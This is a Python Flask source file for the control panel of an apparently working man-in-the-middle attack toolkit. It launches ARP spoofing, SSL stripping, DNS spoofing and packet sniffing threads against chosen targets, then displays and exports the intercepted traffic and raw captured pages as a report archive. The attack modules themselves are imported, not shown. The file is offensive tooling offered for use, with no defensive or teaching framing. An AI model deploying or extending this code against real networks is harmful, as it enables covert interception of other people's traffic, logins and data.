from flask import Flask, render_template, jsonify, request, Response, send_file
import threading
from core import STATUS, STOP_EVENT, CAPTURE_DIR
from core.arp import run_attack_loop
from core.ssl_strip import run_ssl_strip
from core.dns import start_dns_spoofing 
from core.sniffer import start_sniffer
from core.scanner import scan_network   
import csv
import io
import zipfile 
import os
from core.utils import log_msg, activate_silence_timer       

def create_app():
    app = Flask(__name__)
    # Track active threads to manage lifecycle
    threads = {'attack': None, 'sniffer': None, 'ssl': None, 'dns': None}

    @app.route('/')
    def index(): return render_template('index.html', data=STATUS)

    @app.route('/action', methods=['POST'])
    def action():
        req = request.json
        act = req.get('action')

        if act == 'clear_logs':
            STATUS["logs"] = [] 
            return jsonify({"status": "cleared"})
        if act == 'clear_data':
            STATUS["intercepted_data"] = []
            return jsonify({"status": "cleared"})
            
        if act == 'stop':
            # Signal all threads to terminate
            STOP_EVENT.set()
            # Mute logs briefly to hide aggressive thread termination messages
            activate_silence_timer()
            return jsonify({"status": "stopped"})

        if 'start' in act:
            # Prevent race conditions where double-clicks start parallel attacks
            if threads['attack'] and threads['attack'].is_alive():
                 return jsonify({"status": "already_running", "message": "Attack is already active."})

            # Reset stop signal for the new session
            STOP_EVENT.clear()
            
            # Handle multiple target inputs or legacy single target
            target_list = req.get('targets', [])
            if not target_list and req.get('target'):
                target_list = [req.get('target')]
                
            STATUS["targets"] = target_list
            STATUS["gateway"] = req.get('gateway')
            STATUS["interface"] = req.get('interface')
            STATUS["dns_domain"] = req.get('dns_domain')
            STATUS["dns_ip"] = req.get('dns_ip')
        
            if act == 'start_dns': STATUS["active_tab"] = 'dns'
            elif act == 'start_sslstrip': STATUS["active_tab"] = 'ssl'
            elif act == 'start_silent': STATUS["active_tab"] = 'silent'
            
            # Ensure background packet sniffer is running (singleton)
            if not threads['sniffer'] or not threads['sniffer'].is_alive():
                threads['sniffer'] = threading.Thread(target=start_sniffer, daemon=True)
                threads['sniffer'].start()

            passive_mode = False

            if act == 'start_silent':
                STATUS["mode"] = "SILENT"
                passive_mode = True 
            elif act == 'start_dns':
                STATUS["mode"] = "DNS SPOOF"
                threads['dns'] = threading.Thread(target=start_dns_spoofing, daemon=True)
                threads['dns'].start()
            elif act == 'start_sslstrip':
                STATUS["mode"] = "SSL STRIP"
                threads['ssl'] = threading.Thread(target=run_ssl_strip, daemon=True)
                threads['ssl'].start()

            # Launch ARP spoofing in a background daemon thread
            threads['attack'] = threading.Thread(
                target=run_attack_loop, 
                args=(STATUS["targets"], STATUS["gateway"], passive_mode), 
                daemon=True
            )
            threads['attack'].start()
            
            return jsonify({"status": "started"})
            
    @app.route('/update')
    def update(): return jsonify(STATUS)

    @app.route('/view/<pkt_id>')
    def view_packet(pkt_id):
        try:
            with open(f"{CAPTURE_DIR}/{pkt_id}.html", "r", encoding="utf-8") as f:
                content = f.read()
            return Response(content, mimetype='text/plain') 
        except: return "File not found."

    @app.route('/scan', methods=['POST'])
    def scan_route():
        interface = request.json.get('interface', 'eth0')
        try:
            active_hosts = scan_network(interface)
            return jsonify({"status": "success", "hosts": active_hosts})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})

    @app.route('/export')
    def export_data():
        memory_file = io.BytesIO()
        
        # Create an in-memory ZIP file containing logs and captures
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            
            # Generate CSV report from intercept memory
            si = io.StringIO()
            cw = csv.writer(si)
            cw.writerow(['Timestamp', 'Source IP', 'Destination', 'Type', 'Content Snippet', 'Full Packet ID'])
            
            for item in STATUS["all_intercepted_data"]:
                cw.writerow([
                    item.get('time', ''),
                    item.get('src', ''),
                    item.get('dst', ''),
                    item.get('type', ''),
                    item.get('snippet', ''),
                    item.get('id', '')
                ])
            zf.writestr('intercept_report.csv', si.getvalue())
            
            # Save raw console logs
            logs_content = "\n".join(STATUS["all_logs"])
            zf.writestr('console_logs.txt', logs_content)
                
            # Archive raw HTML captures
            if os.path.exists(CAPTURE_DIR):
                for root, dirs, files in os.walk(CAPTURE_DIR):
                    for file in files:
                        abs_path = os.path.join(root, file)
                        zf.write(abs_path, arcname=os.path.join('raw_captures', file))

        memory_file.seek(0)
        return send_file(
            memory_file, 
            mimetype="application/zip", 
            as_attachment=True, 
            download_name="mitm_report.zip"
        )

    return app